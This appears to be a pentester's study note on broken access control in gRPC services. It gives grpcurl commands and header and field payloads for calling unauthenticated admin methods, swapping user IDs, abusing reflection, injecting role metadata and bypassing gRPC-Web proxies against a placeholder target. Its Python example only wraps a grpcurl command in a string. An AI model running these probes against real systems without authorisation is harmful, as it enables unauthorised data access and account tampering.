---
tags: [bac, theory, grpc, microservices, protobuf]
type: theory
severity: high
owasp_ref: "A01:2021"
date: 2026-03-10
---

# ⚙️ gRPC Broken Access Control

## Why gRPC Is Different
gRPC runs on HTTP/2 with binary Protobuf encoding — standard tools and WAFs see garbage. Auth in gRPC is **not automatic**: developers must manually attach interceptors to every service method. When they forget — or apply interceptors at the wrong scope — you get BAC.

---

## gRPC Auth Architecture & Where It Breaks

```
gRPC auth chain:
  Client → [Channel credentials / TLS] → Server
         → [Call credentials / token]  → Interceptor
                                        ↓
                                   Method handler

Three places auth can be missing:
  1. No server-side interceptor at all  → any method is open
  2. Interceptor on service, not method → some methods unprotected
  3. Interceptor checks auth but not authZ → authed ≠ authorized
```

---

## Attack 1: Missing Auth Interceptor on Admin Methods

```protobuf
// Service definition (from .proto file)
service UserService {
  rpc GetUser (GetUserRequest) returns (UserResponse);      // has auth
  rpc DeleteUser (DeleteUserRequest) returns (Empty);       // forgot interceptor!
  rpc ListAllUsers (Empty) returns (UserListResponse);      // forgot interceptor!
  rpc ResetUserPassword (ResetRequest) returns (Empty);     // forgot interceptor!
}
```

```bash
# Test with grpcurl — call without any credentials:
grpcurl -plaintext target.com:50051 \
  userservice.UserService/ListAllUsers

# If it returns data without a token → missing auth!
```

---

## Attack 2: Object-Level Authorization Missing (gRPC BOLA)

```bash
# You own user 1337. Test access to user 1338:
grpcurl -plaintext \
  -H "authorization: Bearer YOUR_TOKEN" \
  -d '{"user_id": "1338"}' \
  target.com:50051 \
  userservice.UserService/GetUser

# Or with protobuf binary:
echo '{"user_id": "1338"}' | \
  grpcurl -plaintext \
  -H "authorization: Bearer YOUR_TOKEN" \
  -d @ target.com:50051 \
  userservice.UserService/GetPrivateProfile
```

---

## Attack 3: Service Reflection Abuse

```bash
# gRPC reflection lets you discover all services/methods WITHOUT the .proto file
# Many servers leave reflection enabled in production

# List all services:
grpcurl -plaintext target.com:50051 list

# List methods of a service:
grpcurl -plaintext target.com:50051 list com.target.UserService

# Describe a method (get full protobuf schema):
grpcurl -plaintext target.com:50051 describe com.target.UserService.GetUser

# Now you know every method and its request schema — enumerate them all
```

---

## Attack 4: Metadata Injection (gRPC's "Headers")

```bash
# gRPC uses metadata (key-value pairs) instead of HTTP headers
# Some servers trust metadata for auth decisions

# Inject role metadata:
grpcurl -plaintext \
  -H "authorization: Bearer LOW_PRIV_TOKEN" \
  -H "x-user-role: admin" \
  -H "x-internal-user: true" \
  -H "x-forwarded-for: 127.0.0.1" \
  -d '{"user_id": "9999"}' \
  target.com:50051 \
  com.target.AdminService/DeleteUser

# Also try:
-H "grpc-metadata-role: admin"
-H "x-grpc-admin: 1"
-H "user-type: internal"
```

---

## Attack 5: gRPC-Web Proxy Bypass

```
Many gRPC backends are fronted by a gRPC-Web proxy (Envoy, nginx)
that handles HTTP/1.1 → HTTP/2 translation.

The proxy may enforce auth, but the raw gRPC port may not:
  - gRPC-Web (port 443/80):  auth enforced by proxy ✅
  - Raw gRPC (port 50051):   auth enforced? ← test this

Try connecting directly to the backend gRPC port:
grpcurl -plaintext target.com:50051 list
→ If you get a response: backend has no auth
```

---

## Attack 6: Protobuf Field Manipulation

```python
#!/usr/bin/env python3
"""
Protobuf field injection — if you have the .proto schema
or can infer fields from reflection
"""
# If you don't have .proto, use grpcurl's dynamic mode (it uses reflection)

# Example: add undocumented is_admin field to request
# Some servers accept extra protobuf fields silently (unknown fields)

import grpc
from google.protobuf import descriptor_pool, message_factory

# Dynamic protobuf construction:
grpcurl_cmd = """
grpcurl -plaintext \
  -H "authorization: Bearer TOKEN" \
  -d '{
    "user_id": "me",
    "is_admin": true,
    "role": "admin",
    "internal": true
  }' \
  target.com:50051 \
  com.target.UserService/UpdateProfile
"""
# Unknown fields in protobuf are often silently ignored by strict parsers
# but some frameworks (especially older Go/Java) may bind them to model fields
```

---

## gRPC Recon & Discovery

```bash
# 1. Discover gRPC ports — typically 50051, 443, 8080, 9090
nmap -p 50051,443,8080,9090 --script=grpc-info target.com

# 2. Check if reflection is enabled:
grpcurl -plaintext target.com:50051 list 2>&1
# "Failed to list services: server does not support the reflection API" = disabled
# List of services = reflection enabled!

# 3. Enumerate all methods:
grpcurl -plaintext target.com:50051 list | while read svc; do
  echo "=== $svc ==="
  grpcurl -plaintext target.com:50051 list "$svc"
done

# 4. Get full schema for all methods:
grpcurl -plaintext target.com:50051 describe > grpc_schema.txt

# 5. If reflection disabled, find .proto files in:
#    - GitHub repos (search org:target "*.proto" language:protobuf)
#    - Android APK (decompile, look for .proto or generated pb.go/pb.java)
#    - npm packages (check for grpc-generated files)
#    - Docker images (strings on binary to find proto definitions)

# 6. Convert .proto to gRPC calls:
protoc --descriptor_set_out=desc.pb --include_imports service.proto
grpcurl -protoset desc.pb target.com:50051 list
```

---

## Tools

```bash
# grpcurl — primary tool, like curl for gRPC
brew install grpcurl
# or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# grpc-client-cli — interactive gRPC client
npm install -g grpc-client-cli

# BloomRPC — GUI gRPC client (like Postman for gRPC)
# https://github.com/bloomrpc/bloomrpc

# Burp Suite — gRPC support via "gRPC Protobuf Decoder" extension
# BApp Store: "gRPC" extension by nicowillis

# Evans — REPL gRPC client
go install github.com/ktr0731/evans@latest
evans --host target.com --port 50051 repl

# Postman — now supports gRPC natively (v10+)
```

---

## Tasks
- [ ] #task Check if target has any gRPC services (ports 50051, 8080, 9090)
- [ ] #task Test gRPC reflection — run `grpcurl list` on discovered ports
- [ ] #task Enumerate all services and methods via reflection
- [ ] #task Test each method without auth credentials
- [ ] #task Test BOLA: swap user IDs in gRPC requests
- [ ] #task Test metadata injection: add role/admin metadata headers
- [ ] #task Check if gRPC-Web proxy exposes raw gRPC backend port
- [ ] #task Test protobuf field injection (is_admin, role in request body)

---

## 🔗 Related Notes
- [[API-BAC]]
- [[IDOR-Techniques]]
- [[Privilege-Escalation]]
- [[Testing-Checklist]]

---
*Tags: #grpc #bac #theory #microservices #protobuf*
